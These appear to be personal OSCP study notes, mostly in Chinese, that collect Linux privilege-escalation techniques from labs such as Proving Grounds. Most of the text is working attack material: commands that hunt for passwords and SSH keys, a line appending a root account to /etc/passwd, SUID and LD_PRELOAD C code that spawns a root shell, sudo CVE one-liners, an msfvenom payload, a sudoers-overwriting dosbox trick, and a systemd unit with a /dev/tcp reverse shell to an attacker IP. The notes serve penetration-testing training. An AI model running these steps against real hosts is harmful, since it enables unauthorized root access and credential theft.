>[!NOTE]
>vincent補充，自動化列舉工具不能代替手動列舉，OSCP考試會故意讓自動化列舉工具找不到漏洞。
# 列舉方式
>[!NOTE]
>建議建立密碼表，讓密碼可以重複使用
## 手動列舉方式
* 身分、群組
```
id
```
* 使用者
```
/etc/passwd
```
* 主機名稱
```
hostname
```
* 系統版本
```
uname -a
```
* 執行程式
```
ps aux
```
* 排程
```
ls -lah /etc/cron*
```
```
crontab -l
```
* 安裝軟體
```
grep "CRON" /var/log/syslog
```
```
dpkg -l
```
```
rpm -qa
```
* 可寫入空間
```
dpkg -l
```
* all drives 
```
cat /etc/fstab
```
* all available disks 
```
lsblk
```
* SUID
```
find / -perm -u=s -type f 2>/dev/null
```
- SGID
```
find / -type f -perm -04000 -ls 2>/dev/null
```
## 自動列舉方式
- unix-privesc-check
- LinEnum
- LinPeas(推)
- linux-exploit-suggester
- Linux Priv Checker 
###  pspy - unprivileged Linux process snooping
[pspy](https://github.com/DominicBreuker/pspy)
```
./pspy64 -pf -i 1000
```
- How to exit pspy64 without losing shell
```
timeout 20 ./pspy64 
```
# 密碼匿藏位置
- Source Code
- Database
- txt file, note file
- comment
- Password manager
- config file
- env
- .bashrc
- process
- history
- cat .bash_history

## 尋找密碼檔案
```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
```
## 尋找密碼檔案
```
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```
## 詢找ssh key
```
find / -name authorized_keys 2> /dev/null
```
```
find / -name id_rsa 2> /dev/null
```
## 尋找process內的密碼
```
watch -n 1 "ps -aux | grep pass"
```
# 提權手法
>[!NOTE]
>本章收錄OSCP、TryHackMe等資料所綜整而成
## 排程提權
- 檢查排程中的log
```
grep "CRON" /var/log/syslog
```
- 檢查排程
```
crontab -l
```
```
cat /etc/crontab
```
```
ls -lah /etc/cron*
```
```
cat /etc/cron* /etc/at* /etc/anacrontab/var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
- 排程提權腳本
```
echo -ne "/sbin/adduser<user>; echo '<user>:<password>' | /usr/sbin/chpasswd; /sbin/adduser<user>sudo" > /usr/local/sbin/cron-logrotate.sh
```
## /etc/password竄改
- 用openssl製造密碼
```
openssl passwd w00t
```
- 寫入/etc/passwd
```
echo 'root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd
```
## /etc/shadow可檢視
- 合併passwd及shadow
```
unshadow passwd shadow > unshadow
```
- 用hashcat破解
```
hashcat -m 1800 unshadow /usr/share/wordlists/rockyou.txt
```
## /etc/shadow可以修改
>[!NOTE]
>產出的內容寫到root帳號的密碼裡面
```
mkpasswd -m sha-512 hacker
```
## SUID/SGID 利用
>[!WARNING]
>除了GTFOBins，也要搜尋弱點程式。
```
find / -perm -u=s -type f 2>/dev/null
```
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
## SUID/SGID - Shared Object Injection
- 尋找遺失的.so檔案
```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```
- 編寫C語言
``` c
#include <stdio.h> 
#include <stdlib.h> 
static void inject() __attribute__((constructor)); 
void inject() { 
	setuid(0); 
	system("/bin/bash -p"); 
}
```
* 編譯C語言
```
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```
## SUID/SGID - Environment Variables
>[!NOTE]
>SUID/SGID + Path Injection 組合技巧
- 利用strings分析SUID/SGID 有使用那些binary
```
strings /usr/local/bin/suid-env
```
- 找到後利用C語言撰寫程式
```c
int main()
{ 
	setuid(0); 
	system("/bin/bash -p"); 
}
```
```
gcc -o service /home/user/tools/suid/service.c
```
- 修改PATH後把C語言的binray放在執行目錄
## capabilities利用
- 搜尋指令
```
/usr/sbin/getcap -r / 2>/dev/null
```
-  比如說python2.6 有capabilities
```
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
## sudo 提權
>[!NOTE]
>請一定要檢查到sudo
```
sudo -l
```
* CVE-2019-14287
```
sudo -u#-1 /bin/bash
```
- CVE-2019-18634
>sudo version < 1.8.26
https://github.com/saleemrashid/sudo-cve-2019-18634
## LD_PRELOAD
當使用`sudo -l`的時候，上面會出現這一段字
```
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD
```
- 利用C語言撰寫LD_PRELOAD的.so檔案
``` c
#include <stdio.h> 
#include <stdlib.h> 
#include <sys/types.h> 
void _init() 
{ 
	unsetenv("LD_PRELOAD"); 
	setgid(0); 
	setuid(0); 
	system("/bin/bash"); 
}
```
- 編譯C語言檔案
```
gcc -shared -fPIC shell.c -o shell.so
```
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
- 替換原本的.so檔案
```
sudo LD_PRELOAD=/home/user/shell.so apache2
```
## Kernel Vulnerabilities
>[!NOTE]
>因為要找人家寫好的exploit，所以要很確定版本資訊
* system訊息
```
cat /etc/issue
```
- kernel版本
```
uname -r
```
- 核心架構
```
arch
```
- searchsploit
```
linux kernel Ubuntu 16 Local Privilege Escalation
```
- 利用grep增加searchsploit的結果精準度
```
grep -v " < 4.4.0" | grep -v "4.8"
```
```
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
```
## NFS Root Squashing
```
cat /etc/exports
```
>可以發現有/tmp目錄，可能可以利用。
### Kali Linux操作
>[!NOTE]
>這個部份是在Kali 上面操作

- 掛載nfs
```
mkdir /tmp/nfs 
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
```
- 產生payload
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```
```
chmod +xs /tmp/nfs/shell.elf
```
### 提權
```
/tmp/shell.elf
```
## PATH Injection
>[!NOTE]
>利用path執行順序的方式提權
```
#!/bin/bash 
cp /bin/bash /tmp/rootbash 
chmod +xs /tmp/rootbash
```
# 提權隨筆
>[!NOTE]
>紀錄一些雜項技術以及靶機筆記
## 透過重新啟動時帶動的服務
>[!NOTE]
>Proving Grounds -Hetemit

``` title:linux.server
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart= bash -c "bash -i >& /dev/tcp/192.168.45.223/50000 0>&1"
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target

```
## sudo gcore提權手法
>[!NOTE]
>Proving Grounds -Pelican

>It can be used to generate core dumps of running processes. Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named `core.$PID`, that is then often filtered with `strings` to narrow down relevant information.

根據gtfobins描述，gcore可以撈到process裡面的memory，所以可以做兩個方面的利用
### 抓取ssh process
``` =
charles@instance-1:/etc$ ps -ef | grep ssh
root      1655     1  0 May29 ?        00:00:09 /usr/sbin/sshd -D
root     26334  1655  0 20:17 ?        00:00:00 sshd: charles [priv]
charles  26370 26334  0 20:17 ?        00:00:00 sshd: charles@pts/0
root     29467  1655  0 21:06 ?        00:00:00 sshd: Andre [priv]
Andre    29503 29467  0 21:06 ?        00:00:00 sshd: Andre@pts/1
charles  29551 26371  0 21:07 pts/0    00:00:00 grep --color=auto ssh
```
```
charles@instance-1:/etc$ sudo gcore 29467
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
0x00007fb85ba4d7f0 in __poll_nocancel () at ../sysdeps/unix/syscall-template.S:84
84      ../sysdeps/unix/syscall-template.S: No such file or directory.
Saved corefile core.29467
```
### 抓取`/usr/bin/password-store`
```
charles@pelican:/opt/zookeeper$ ps aux | grep pass
ps aux | grep pass
root       513  0.0  0.0   2276    72 ?        Ss   10:56   0:00 /usr/bin/password-store
charles   9657  0.0  0.0   6076   884 pts/0    S+   11:30   0:00 grep pass
```
```
strings core.513
```
## dosbox Privilege Escalation
>[!WARNING]
>因為GTFobins沒有講得很清楚，所以做一個筆記
``` title:add_user_commander_to sudoers
LFILE='/etc/sudoers'
/usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL) NOPASSWD: ALL >> c:$LFILE" -c exit
```
